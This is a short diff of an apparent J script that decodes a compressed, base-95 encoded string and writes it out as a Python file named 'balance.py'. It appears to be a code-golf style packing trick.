@@ -1,2 +1,3 @@
-((' "&()*+-.012:<=>[]acdefhiklmnopqrstuwxy{}',~LF,CR){~43#.inv 95x#.32-~3 u:'!_I-0tD/CL!h\O.t{G)^0eq:dz:>@{P:`n6[jMa6ylUM@P_T/:g:R\_#[&F@]V}bG4I1vd\pPym%x+<7~+S''i%P"4$GhJ!I~Sw.A~qvk"4[&//B,x.Kh!+ <oeA=iogggz~b$:f) 1W(Qjg7I!}^''B"&U2| X3*=NU|/''H&N/4e/~K}\80}\nsW=%`vyH8jQlk@"vJAK0F&78vJYpDgI LDZjTfOqGPL<yjhHQx<@aSnF')1!:2<'balance.py'
+q=.(' "&''()*+-.012:;=>[\]acdefhiklmnopqrstuwxy{}',~LF,CR){~45#.inv 95x#.32-~3 u:'/fI_CUF4qtev>-U;-DO<|sji;udM*A~SWsmys?*V@6iM"DYU^H>Ew^%y,2G)g9dM-V4#''(f!<dU|K1t>64Z(|g@mNVU%^MJ&gf*\)>_Gqj[\1k2KEM6I",zz`'']Gg%9U~SG%3r;@+;6ll4[b;$J''\2u7*? |t7vE;M(Kn!4^O@Ygit 0^$|gT.d_qU2fULbyq~V(9f!0"''xj_izchMB~}"Y6yrDwYQ`~NJ^G)''Xk|).D|v''onC<;Itpb>#1{K{5O7`JacCwtk}Hwo''lz=&oiBY*''8|'
+q 1!:2<'balance.py'
 exit 0
